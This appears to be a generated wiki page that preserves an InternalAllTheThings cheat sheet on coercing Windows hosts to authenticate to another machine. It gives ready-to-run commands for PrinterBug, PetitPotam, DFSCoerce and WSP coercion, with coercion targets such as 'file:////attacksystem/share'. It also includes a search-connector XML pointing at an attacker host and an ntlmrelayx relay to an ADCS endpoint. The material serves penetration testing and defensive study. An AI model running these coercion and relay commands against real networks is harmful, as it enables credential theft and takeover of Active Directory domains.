---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Internal - Coerce

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-internal-relay-coerce` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-relay-coerce.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Internal - Coerce](../../topics/active-directory/internal-coerce.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-internal-relay-coerce |
| name | Internal - Coerce |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/internal-relay-coerce.md |

## Preserved Source Material

````yaml
_body: "# Internal - Coerce\n\nCoerce refers to forcing a target machine (usually with SYSTEM privileges) to authenticate\
  \ to another machine.\n\n## Signing\n\n### Server Side Signing\n\n| Operating System | SMB Signing | LDAP Signing |\n| -------------------------------\
  \ | --- | --- |\n| Windows Server 2019 DC          | ✅  |  ❌ |\n| Windows Server 2022 DC pre 23H2 | ✅  |  ❌ |\n| Windows\
  \ Server 2022 DC 23H2     | ✅  |  ✅ |\n| Windows Server 2025 DC          | ✅  |  ✅ |\n| Windows Server 2019 Member     \
  \ | ❌  |  -  |\n| Windows Server 2022 Member      | ❌  |  -  |\n| Windows Server 2025 Member      | ❌  |  -  |\n| Windows\
  \ 10                      | ❌  |  -  |\n| Windows 11 23H2                 | ❌  |  -  |\n| Windows 11 24H2              \
  \   | ✅  |  -  |\n\n* Server-side SMB signing has been enabled on domain controllers\n* Server-side SMB signing is still\
  \ not required by default on non-DC Windows server\n\n### EPA\n\n* [zyn3rgy/RelayInformer](https://github.com/zyn3rgy/RelayInformer)\
  \ - Python and BOF utilites to the determine EPA enforcement levels of popular NTLM relay targets from the offensive perspective.\n\
  \n```ps1\nuv run relayinformer mssql --target 10.10.10.10 --user USER --password PASSWORD\nuv run relayinformer http --url\
  \ http://10.10.10.10/page --user USER --password PASSWORD\nuv run relayinformer ldap --method BOTH --dc-ip 10.10.10.10 --user\
  \ USER --password PASSWORD\nuv run relayinformer ldap --method LDAPS --dc-ip 10.10.10.10 --user USER --password PASSWORD\n\
  ```\n\n| EPA Values | Description |\n| ---------- | ----------- |\n| Disabled / Never | You should generally be able to\
  \ target with NTLM relay, regardless of the client's support for EPA or version of NTLM being used. |\n| Allowed / Accepted\
  \ / When Supported | You can theoretically conduct an NTLM relay but common relay scenarios will not work because standard\
  \ coercion / poisoning techniques (mentioned above) will result in the addition of EPA-relevant AV pairs, indicating the\
  \ client’s support for EPA. |\n| Required | NTLM relay should be prevented by validation of values provided in EPA-relevant\
  \ AV pairs. |\n\n## WebClient Service\n\n* On Windows workstations, the WebClient service is installed by default.\n* On\
  \ Windows servers, it is not installed by default\n\n**Enable WebClient**:\n\nWebClient service can be enabled on the machine\
  \ using several techniques:\n\n* Mapping a WebDav server using `net` command : `net use ...`\n* Typing anything into the\
  \ explorer address bar that isn't a local file or directory\n* Browsing to a directory or share that has a file with a `.searchConnector-ms`\
  \ extension located inside.\n\n    ```xml\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <searchConnectorDescription\
  \ xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">\n        <description>Microsoft Outlook</description>\n\
  \        <isSearchOnlyItem>false</isSearchOnlyItem>\n        <includeInStartMenuScope>true</includeInStartMenuScope>\n \
  \       <templateInfo>\n            <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>\n        </templateInfo>\n\
  \        <simpleLocation>\n            <url>http://attacksystem/path</url>\n        </simpleLocation>\n    </searchConnectorDescription>\n\
  \    ```\n\nCheck if the WebDav service is running\n\n```ps1\nnxc smb <ip> -u 'user' -p 'pass' -M webdav\n```\n\n## MS-RPRN\
  \ - PrinterBug\n\n**Tools**:\n\n* [leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample) - PoC tool\
  \ to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface.\n\n**Examples**:\n\n```ps1\npoetry\
  \ run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=PrinterBug\n```\n\nChecking if the Spooler\
  \ Service is running.\n\n```ps1\nnxc smb <ip> -u 'user' -p 'pass' -M spooler\n```\n\n## MS-EFSR - PetitPotam\n\nThe tools\
  \ use the LSARPC named pipe with interface `c681d488-d850-11d0-8c52-00c04fd90f7e` because it's more prevalent. But it's\
  \ possible to trigger with the EFSRPC named pipe and interface `df1941c5-fe89-4e79-bf10-463657acf44d`.\n\n**Tools**:\n\n\
  * [topotam/PetitPotam](https://github.com/topotam/PetitPotam) - PoC tool to coerce Windows hosts to authenticate to other\
  \ machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.\n\n**Examples**:\n\n```ps1\npoetry run nxc smb 10.10.10.10/24\
  \ -u username -p password -M coerce_plus -o METHOD=PetitPotam\n```\n\n## MS-DFSNM - DFS Coercion\n\nDFS Coerce (MS-DFSNM\
  \ abuse) is a technique to force a Windows system to authenticate to an attacker-controlled machine by abusing the DFS Namespace\
  \ Management RPC interface.\n\n**Tools**:\n\n* [Wh04m1001/DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) - PoC for MS-DFSNM\
  \ coerce authentication using NetrDfsRemoveStdRoot and NetrDfsAddStdRoot methods.\n\n**Examples**:\n\n```ps1\npython3 dfscoerce.py\
  \ -u username -d domain.local 10.10.10.10 10.10.10.11\npoetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus\
  \ -o METHOD=DFSCoerce\n```\n\n## MS-WSP - WSP Coercion\n\n* The `wsearch` service is only enabled by default on workstations,\
  \ and has been disabled on servers since Server 2016.\n* Only SMB connections can be coerced with WSP.\n\n**Tools**:\n\n\
  * [slemire/WSPCoerce](https://github.com/slemire/WSPCoerce) - PoC to coerce authentication from Windows hosts using MS-WSP.\n\
  * [RedTeamPentesting/wspcoerce](https://github.com/RedTeamPentesting/wspcoerce) - wspcoerce coerces a Windows computer account\
  \ via SMB to an arbitrary target using MS-WSP.\n\n**Examples**:\n\n```ps1\nWSPCoerce.exe <target> <listener>\nWSPCoerce.exe\
  \ labsw1 172.23.10.109\nWSPCoerce.exe labsw1 labsrv1\n\nwspcoerce 'lab.redteam/rtpttest:test1234!@192.0.2.115' \"file:////attacksystem/share\"\
  \nntlmrelayx.py -t \"http://192.0.2.5/certsrv/\" -debug -6 -smb2support --adcs\n```\n\n* Can't use an IP address for the\
  \ target, use a short hostname only (no FQDN)\n* Make sure to use a hostname or FQDN for the listener if you want to receive\
  \ Kerberos auth\n\n## References\n\n* [Changes to SMB Signing Enforcement Defaults in Windows 24H2 - Michael Grafnetter\
  \ - January 26, 2025](https://www.dsinternals.com/en/smb-signing-windows-server-2025-client-11-24h2-defaults/)\n* [Less\
  \ Praying More Relaying – Enumerating EPA Enforcement for MSSQL and HTTPS - Nick Powers, Matt Creel - November 25, 2025](https://specterops.io/blog/2025/11/25/less-praying-more-relaying-enumerating-epa-enforcement-for-mssql-and-https/)\n\
  * [The Ultimate Guide to Windows Coercion Techniques in 2025 - RedTeam Pentesting - June 4, 2025](https://blog.redteam-pentesting.de/2025/windows-coercion/)"
_relative_path: active-directory/internal-relay-coerce.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-relay-coerce.md
````
